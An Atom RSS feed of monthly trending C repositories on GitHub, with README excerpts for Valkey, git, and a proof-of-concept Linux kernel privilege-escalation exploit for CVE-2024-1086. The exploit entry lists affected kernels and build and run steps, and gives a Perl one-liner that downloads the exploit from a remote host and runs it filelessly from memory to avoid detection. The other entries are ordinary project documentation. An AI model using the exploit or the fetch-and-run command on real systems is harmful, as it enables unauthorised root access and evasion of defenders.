<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub C Monthly Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2024-05-01T01:44:16Z</updated>
  <subtitle>Monthly Trending of C in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>valkey-io/valkey</title>
    <updated>2024-05-01T01:44:16Z</updated>
    <id>tag:github.com,2024-05-01:/valkey-io/valkey</id>
    <link href="https://github.com/valkey-io/valkey" rel="alternate"></link>
    <summary type="html">&lt;p&gt;A new project to resume development on the formerly open-source Redis project. We&#39;re calling it Valkey, since it&#39;s a twist on the key-value datastore.&lt;/p&gt;&lt;hr&gt;&lt;p&gt;&lt;a href=&#34;https://codecov.io/gh/valkey-io/valkey&#34;&gt;&lt;img src=&#34;https://codecov.io/gh/valkey-io/valkey/graph/badge.svg?token=KYYSJAYC5F&#34; alt=&#34;codecov&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;This README is under construction as we work to build a new community driven high performance key-value store.&lt;/p&gt; &#xA;&lt;p&gt;This project was forked from the open source Redis project right before the transition to their new source available licenses.&lt;/p&gt; &#xA;&lt;p&gt;This README is just a fast &lt;em&gt;quick start&lt;/em&gt; document. We are currently working on a more permanent documentation page.&lt;/p&gt; &#xA;&lt;h2&gt;What is Valkey?&lt;/h2&gt; &#xA;&lt;p&gt;Valkey is a high-performance data structure server that primarily serves key/value workloads. It supports a wide range of native structures and an extensible plugin system for adding new data structures and access patterns.&lt;/p&gt; &#xA;&lt;h2&gt;Building Valkey&lt;/h2&gt; &#xA;&lt;p&gt;Valkey can be compiled and used on Linux, OSX, OpenBSD, NetBSD, FreeBSD. We support big endian and little endian architectures, and both 32 bit and 64 bit systems.&lt;/p&gt; &#xA;&lt;p&gt;It may compile on Solaris derived systems (for instance SmartOS) but our support for this platform is &lt;em&gt;best effort&lt;/em&gt; and Valkey is not guaranteed to work as well as in Linux, OSX, and *BSD.&lt;/p&gt; &#xA;&lt;p&gt;It is as simple as:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;% make&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;To build with TLS support, you&#39;ll need OpenSSL development libraries (e.g. libssl-dev on Debian/Ubuntu) and run:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;% make BUILD_TLS=yes&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;To build with systemd support, you&#39;ll need systemd development libraries (such as libsystemd-dev on Debian/Ubuntu or systemd-devel on CentOS) and run:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;% make USE_SYSTEMD=yes&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;To append a suffix to Valkey program names, use:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;% make PROG_SUFFIX=&#34;-alt&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;You can build a 32 bit Valkey binary using:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;% make 32bit&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;After building Valkey, it is a good idea to test it using:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;% make test&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;If TLS is built, running the tests with TLS enabled (you will need &lt;code&gt;tcl-tls&lt;/code&gt; installed):&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;% ./utils/gen-test-certs.sh&#xA;% ./runtest --tls&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Fixing build problems with dependencies or cached build options&lt;/h2&gt; &#xA;&lt;p&gt;Valkey has some dependencies which are included in the &lt;code&gt;deps&lt;/code&gt; directory. &lt;code&gt;make&lt;/code&gt; does not automatically rebuild dependencies even if something in the source code of dependencies changes.&lt;/p&gt; &#xA;&lt;p&gt;When you update the source code with &lt;code&gt;git pull&lt;/code&gt; or when code inside the dependencies tree is modified in any other way, make sure to use the following command in order to really clean everything and rebuild from scratch:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;% make distclean&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;This will clean: jemalloc, lua, hiredis, linenoise and other dependencies.&lt;/p&gt; &#xA;&lt;p&gt;Also if you force certain build options like 32bit target, no C compiler optimizations (for debugging purposes), and other similar build time options, those options are cached indefinitely until you issue a &lt;code&gt;make distclean&lt;/code&gt; command.&lt;/p&gt; &#xA;&lt;h2&gt;Fixing problems building 32 bit binaries&lt;/h2&gt; &#xA;&lt;p&gt;If after building Valkey with a 32 bit target you need to rebuild it with a 64 bit target, or the other way around, you need to perform a &lt;code&gt;make distclean&lt;/code&gt; in the root directory of the Valkey distribution.&lt;/p&gt; &#xA;&lt;p&gt;In case of build errors when trying to build a 32 bit binary of Valkey, try the following steps:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Install the package libc6-dev-i386 (also try g++-multilib).&lt;/li&gt; &#xA; &lt;li&gt;Try using the following command line instead of &lt;code&gt;make 32bit&lt;/code&gt;: &lt;code&gt;make CFLAGS=&#34;-m32 -march=native&#34; LDFLAGS=&#34;-m32&#34;&lt;/code&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Allocator&lt;/h2&gt; &#xA;&lt;p&gt;Selecting a non-default memory allocator when building Valkey is done by setting the &lt;code&gt;MALLOC&lt;/code&gt; environment variable. Valkey is compiled and linked against libc malloc by default, with the exception of jemalloc being the default on Linux systems. This default was picked because jemalloc has proven to have fewer fragmentation problems than libc malloc.&lt;/p&gt; &#xA;&lt;p&gt;To force compiling against libc malloc, use:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;% make MALLOC=libc&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;To compile against jemalloc on Mac OS X systems, use:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;% make MALLOC=jemalloc&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Monotonic clock&lt;/h2&gt; &#xA;&lt;p&gt;By default, Valkey will build using the POSIX clock_gettime function as the monotonic clock source. On most modern systems, the internal processor clock can be used to improve performance. Cautions can be found here: &lt;a href=&#34;http://oliveryang.net/2015/09/pitfalls-of-TSC-usage/&#34;&gt;http://oliveryang.net/2015/09/pitfalls-of-TSC-usage/&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;To build with support for the processor&#39;s internal instruction clock, use:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;% make CFLAGS=&#34;-DUSE_PROCESSOR_CLOCK&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Verbose build&lt;/h2&gt; &#xA;&lt;p&gt;Valkey will build with a user-friendly colorized output by default. If you want to see a more verbose output, use the following:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;% make V=1&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Running Valkey&lt;/h2&gt; &#xA;&lt;p&gt;To run Valkey with the default configuration, just type:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;% cd src&#xA;% ./valkey-server&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;If you want to provide your valkey.conf, you have to run it using an additional parameter (the path of the configuration file):&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;% cd src&#xA;% ./valkey-server /path/to/valkey.conf&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;It is possible to alter the Valkey configuration by passing parameters directly as options using the command line. Examples:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;% ./valkey-server --port 9999 --replicaof 127.0.0.1 6379&#xA;% ./valkey-server /etc/valkey/6379.conf --loglevel debug&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;All the options in valkey.conf are also supported as options using the command line, with exactly the same name.&lt;/p&gt; &#xA;&lt;h2&gt;Running Valkey with TLS:&lt;/h2&gt; &#xA;&lt;p&gt;Please consult the &lt;a href=&#34;https://raw.githubusercontent.com/valkey-io/valkey/unstable/TLS.md&#34;&gt;TLS.md&lt;/a&gt; file for more information on how to use Valkey with TLS.&lt;/p&gt; &#xA;&lt;h2&gt;Playing with Valkey&lt;/h2&gt; &#xA;&lt;p&gt;You can use valkey-cli to play with Valkey. Start a valkey-server instance, then in another terminal try the following:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;% cd src&#xA;% ./valkey-cli&#xA;valkey&amp;gt; ping&#xA;PONG&#xA;valkey&amp;gt; set foo bar&#xA;OK&#xA;valkey&amp;gt; get foo&#xA;&#34;bar&#34;&#xA;valkey&amp;gt; incr mycounter&#xA;(integer) 1&#xA;valkey&amp;gt; incr mycounter&#xA;(integer) 2&#xA;valkey&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Installing Valkey&lt;/h2&gt; &#xA;&lt;p&gt;In order to install Valkey binaries into /usr/local/bin, just use:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;% make install&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;You can use &lt;code&gt;make PREFIX=/some/other/directory install&lt;/code&gt; if you wish to use a different destination.&lt;/p&gt; &#xA;&lt;p&gt;&lt;em&gt;Note&lt;/em&gt;: For compatibility with Redis, we create symlinks from the Redis names (&lt;code&gt;redis-server&lt;/code&gt;, &lt;code&gt;redis-cli&lt;/code&gt;, etc.) to the Valkey binaries installed by &lt;code&gt;make install&lt;/code&gt;. The symlinks are created in same directory as the Valkey binaries. The symlinks are removed when using &lt;code&gt;make uninstall&lt;/code&gt;. The creation of the symlinks can be skipped by setting the makefile variable &lt;code&gt;USE_REDIS_SYMLINKS=no&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;make install&lt;/code&gt; will just install binaries in your system, but will not configure init scripts and configuration files in the appropriate place. This is not needed if you just want to play a bit with Valkey, but if you are installing it the proper way for a production system, we have a script that does this for Ubuntu and Debian systems:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;% cd utils&#xA;% ./install_server.sh&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;em&gt;Note&lt;/em&gt;: &lt;code&gt;install_server.sh&lt;/code&gt; will not work on Mac OSX; it is built for Linux only.&lt;/p&gt; &#xA;&lt;p&gt;The script will ask you a few questions and will setup everything you need to run Valkey properly as a background daemon that will start again on system reboots.&lt;/p&gt; &#xA;&lt;p&gt;You&#39;ll be able to stop and start Valkey using the script named &lt;code&gt;/etc/init.d/valkey_&amp;lt;portnumber&amp;gt;&lt;/code&gt;, for instance &lt;code&gt;/etc/init.d/valkey_6379&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Code contributions&lt;/h2&gt; &#xA;&lt;p&gt;Please see the &lt;a href=&#34;https://github.com/valkey-io/valkey/raw/unstable/CONTRIBUTING.md&#34;&gt;CONTRIBUTING.md&lt;/a&gt;. For security bugs and vulnerabilities, please see &lt;a href=&#34;https://github.com/valkey-io/valkey/raw/unstable/SECURITY.md&#34;&gt;SECURITY.md&lt;/a&gt;.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>Notselwyn/CVE-2024-1086</title>
    <updated>2024-05-01T01:44:16Z</updated>
    <id>tag:github.com,2024-05-01:/Notselwyn/CVE-2024-1086</id>
    <link href="https://github.com/Notselwyn/CVE-2024-1086" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Universal local privilege escalation Proof-of-Concept exploit for CVE-2024-1086, working on most Linux kernels between v5.14 and v6.6, including Debian, Ubuntu, and KernelCTF. The success rate is 99.4% in KernelCTF images.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;CVE-2024-1086&lt;/h1&gt; &#xA;&lt;p&gt;Universal local privilege escalation Proof-of-Concept exploit for &lt;a href=&#34;https://nvd.nist.gov/vuln/detail/CVE-2024-1086&#34;&gt;CVE-2024-1086&lt;/a&gt;, working on most Linux kernels between v5.14 and v6.6, including Debian, Ubuntu, and KernelCTF. The success rate is 99.4% in KernelCTF images.&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/Notselwyn/CVE-2024-1086/assets/68616630/a3d43951-94ab-4c09-a14b-07b81f89b3de&#34;&gt;https://github.com/Notselwyn/CVE-2024-1086/assets/68616630/a3d43951-94ab-4c09-a14b-07b81f89b3de&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Blogpost / Write-up&lt;/h2&gt; &#xA;&lt;p&gt;A full write-up of the exploit - including background information and loads of useful diagrams - can be found in the &lt;a href=&#34;https://pwning.tech/nftables/&#34;&gt;Flipping Pages blogpost&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Affected versions&lt;/h2&gt; &#xA;&lt;p&gt;The exploit affects versions from (including) v5.14 to (including) v6.6, excluding patched branches v5.15.149&amp;gt;, v6.1.76&amp;gt;, v6.6.15&amp;gt;. The patch for these versions were released in feb 2024. The underlying vulnerability affects all versions (excluding patched stable branches) from v3.15 to v6.8-rc1.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Caveats:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;The exploit does not work on v6.4&amp;gt; kernels with kconfig &lt;code&gt;CONFIG_INIT_ON_ALLOC_DEFAULT_ON=y&lt;/code&gt; (including Ubuntu v6.5)&lt;/li&gt; &#xA; &lt;li&gt;The exploits requires user namespaces (kconfig &lt;code&gt;CONFIG_USER_NS=y&lt;/code&gt;), that those user namespaces are unprivileged (sh command &lt;code&gt;sysctl kernel.unprivileged_userns_clone&lt;/code&gt; = 1), and that nf_tables is enabled (kconfig &lt;code&gt;CONFIG_NF_TABLES=y&lt;/code&gt;). By default, these are all enabled on Debian, Ubuntu, and KernelCTF. Other distro&#39;s have not been tested, but may work as well. Additionally, the exploit has only been tested on x64/amd64.&lt;/li&gt; &#xA; &lt;li&gt;The exploit may be &lt;em&gt;very&lt;/em&gt; unstable on systems with a lot of network activity &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Systems with WiFi adapter, when surrounded by high-usage WiFi networks, will be very unstable.&lt;/li&gt; &#xA;   &lt;li&gt;On test devices, please turn off WiFi adapters through BIOS.&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;The kernel panic (system crash) after running the exploit is a side-effect which deliberately hasn&#39;t been fixed to prevent malicious usage of the exploit (i.e. exploitation attempts should now be more noticable, and unpractical in real-world operations). Despite this, it still allows for a working proof-of-concept in lab environments, as the root shell is functional, and persistence through disk is possible.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Usage&lt;/h2&gt; &#xA;&lt;h3&gt;Configuration&lt;/h3&gt; &#xA;&lt;p&gt;The default values should work out of the box on Debian, Ubuntu, and KernelCTF with a local shell. On non-tested setups/distros, please make sure the kconfig values match with the target kernel. These can be specified in &lt;a href=&#34;https://raw.githubusercontent.com/Notselwyn/CVE-2024-1086/main/src/config.h&#34;&gt;&lt;code&gt;src/config.h&lt;/code&gt;&lt;/a&gt;. If you are running the exploit on a machine with more than 32GiB physical memory, make sure to increase &lt;code&gt;CONFIG_PHYS_MEM&lt;/code&gt;. If you are running the exploit over SSH (into the test machine) or a reverse shell, you may want to toggle &lt;code&gt;CONFIG_REDIRECT_LOG&lt;/code&gt; to &lt;code&gt;1&lt;/code&gt; to avoid unnecessary network activity.&lt;/p&gt; &#xA;&lt;h3&gt;Building&lt;/h3&gt; &#xA;&lt;p&gt;If this is impractical for you, there is an &lt;a href=&#34;https://github.com/Notselwyn/CVE-2024-1086/releases/download/v1.0.0/exploit&#34;&gt;compiled x64 binary&lt;/a&gt; with the default config.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;git clone https://github.com/Notselwyn/CVE-2024-1086&#xA;cd CVE-2024-1086&#xA;make&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Binary: &lt;code&gt;CVE-2024-1086/exploit&lt;/code&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Running&lt;/h3&gt; &#xA;&lt;p&gt;Running the exploit is just as trivial:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;./exploit&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Fileless execution is also supported, in case of pentest situations where detections need to be avoided. However, Perl needs to be installed on the target:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;perl -e &#39;&#xA;  require qw/syscall.ph/;&#xA;&#xA;  my $fd = syscall(SYS_memfd_create(), $fn, 0);&#xA;  system &#34;curl https://example.com/exploit -s &amp;gt;&amp;amp;$fd&#34;;&#xA;  exec {&#34;/proc/$$/fd/$fd&#34;} &#34;memfd&#34;;&#xA;&#39;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Disclaimer&lt;/h2&gt; &#xA;&lt;p&gt;The programs and scripts (&#34;programs&#34;) in this software directory/folder/repository (&#34;repository&#34;) are published, developed and distributed for educational/research purposes only. I (&#34;the creator&#34;) do not condone any malicious or illegal usage of the programs in this repository, as the intend is sharing research and not doing illegal activities with it. I am not legally responsible for anything you do with the programs in this repository.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>git/git</title>
    <updated>2024-05-01T01:44:16Z</updated>
    <id>tag:github.com,2024-05-01:/git/git</id>
    <link href="https://github.com/git/git" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Git Source Code Mirror - This is a publish-only repository but pull requests can be turned into patches to the mailing list via GitGitGadget (https://gitgitgadget.github.io/). Please follow Documentation/SubmittingPatches procedure for any of your improvements.&lt;/p&gt;&lt;hr&gt;&lt;p&gt;&lt;a href=&#34;https://github.com/git/git/actions?query=branch%3Amaster+event%3Apush&#34;&gt;&lt;img src=&#34;https://github.com/git/git/workflows/CI/badge.svg?sanitize=true&#34; alt=&#34;Build status&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h1&gt;Git - fast, scalable, distributed revision control system&lt;/h1&gt; &#xA;&lt;p&gt;Git is a fast, scalable, distributed revision control system with an unusually rich command set that provides both high-level operations and full access to internals.&lt;/p&gt; &#xA;&lt;p&gt;Git is an Open Source project covered by the GNU General Public License version 2 (some parts of it are under different licenses, compatible with the GPLv2). It was originally written by Linus Torvalds with help of a group of hackers around the net.&lt;/p&gt; &#xA;&lt;p&gt;Please read the file &lt;a href=&#34;https://raw.githubusercontent.com/git/git/master/INSTALL&#34;&gt;INSTALL&lt;/a&gt; for installation instructions.&lt;/p&gt; &#xA;&lt;p&gt;Many Git online resources are accessible from &lt;a href=&#34;https://git-scm.com/&#34;&gt;https://git-scm.com/&lt;/a&gt; including full documentation and Git related tools.&lt;/p&gt; &#xA;&lt;p&gt;See &lt;a href=&#34;https://raw.githubusercontent.com/git/git/master/Documentation/gittutorial.txt&#34;&gt;Documentation/gittutorial.txt&lt;/a&gt; to get started, then see &lt;a href=&#34;https://raw.githubusercontent.com/git/git/master/Documentation/giteveryday.txt&#34;&gt;Documentation/giteveryday.txt&lt;/a&gt; for a useful minimum set of commands, and &lt;code&gt;Documentation/git-&amp;lt;commandname&amp;gt;.txt&lt;/code&gt; for documentation of each command. If git has been correctly installed, then the tutorial can also be read with &lt;code&gt;man gittutorial&lt;/code&gt; or &lt;code&gt;git help tutorial&lt;/code&gt;, and the documentation of each command with &lt;code&gt;man git-&amp;lt;commandname&amp;gt;&lt;/code&gt; or &lt;code&gt;git help &amp;lt;commandname&amp;gt;&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;CVS users may also want to read &lt;a href=&#34;https://raw.githubusercontent.com/git/git/master/Documentation/gitcvs-migration.txt&#34;&gt;Documentation/gitcvs-migration.txt&lt;/a&gt; (&lt;code&gt;man gitcvs-migration&lt;/code&gt; or &lt;code&gt;git help cvs-migration&lt;/code&gt; if git is installed).&lt;/p&gt; &#xA;&lt;p&gt;The user discussion and development of Git take place on the Git mailing list -- everyone is welcome to post bug reports, feature requests, comments and patches to &lt;a href=&#34;mailto:git@vger.kernel.org&#34;&gt;git@vger.kernel.org&lt;/a&gt; (read &lt;a href=&#34;https://raw.githubusercontent.com/git/git/master/Documentation/SubmittingPatches&#34;&gt;Documentation/SubmittingPatches&lt;/a&gt; for instructions on patch submission and &lt;a href=&#34;https://raw.githubusercontent.com/git/git/master/Documentation/CodingGuidelines&#34;&gt;Documentation/CodingGuidelines&lt;/a&gt;).&lt;/p&gt; &#xA;&lt;p&gt;Those wishing to help with error message, usage and informational message string translations (localization l10) should see &lt;a href=&#34;https://raw.githubusercontent.com/git/git/master/po/README.md&#34;&gt;po/README.md&lt;/a&gt; (a &lt;code&gt;po&lt;/code&gt; file is a Portable Object file that holds the translations).&lt;/p&gt; &#xA;&lt;p&gt;To subscribe to the list, send an email to &lt;a href=&#34;mailto:git+subscribe@vger.kernel.org&#34;&gt;git+subscribe@vger.kernel.org&lt;/a&gt; (see &lt;a href=&#34;https://subspace.kernel.org/subscribing.html&#34;&gt;https://subspace.kernel.org/subscribing.html&lt;/a&gt; for details). The mailing list archives are available at &lt;a href=&#34;https://lore.kernel.org/git/&#34;&gt;https://lore.kernel.org/git/&lt;/a&gt;, &lt;a href=&#34;https://marc.info/?l=git&#34;&gt;https://marc.info/?l=git&lt;/a&gt; and other archival sites.&lt;/p&gt; &#xA;&lt;p&gt;Issues which are security relevant should be disclosed privately to the Git Security mailing list &lt;a href=&#34;mailto:git-security@googlegroups.com&#34;&gt;git-security@googlegroups.com&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;The maintainer frequently sends the &#34;What&#39;s cooking&#34; reports that list the current status of various development topics to the mailing list. The discussion following them give a good reference for project status, development direction and remaining tasks.&lt;/p&gt; &#xA;&lt;p&gt;The name &#34;git&#34; was given by Linus Torvalds when he wrote the very first version. He described the tool as &#34;the stupid content tracker&#34; and the name as (depending on your mood):&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;random three-letter combination that is pronounceable, and not actually used by any common UNIX command. The fact that it is a mispronunciation of &#34;get&#34; may or may not be relevant.&lt;/li&gt; &#xA; &lt;li&gt;stupid. contemptible and despicable. simple. Take your pick from the dictionary of slang.&lt;/li&gt; &#xA; &lt;li&gt;&#34;global information tracker&#34;: you&#39;re in a good mood, and it actually works for you. Angels sing, and a light suddenly fills the room.&lt;/li&gt; &#xA; &lt;li&gt;&#34;goddamn idiotic truckload of sh*t&#34;: when it breaks&lt;/li&gt; &#xA;&lt;/ul&gt;</summary>
  </entry>
</feed>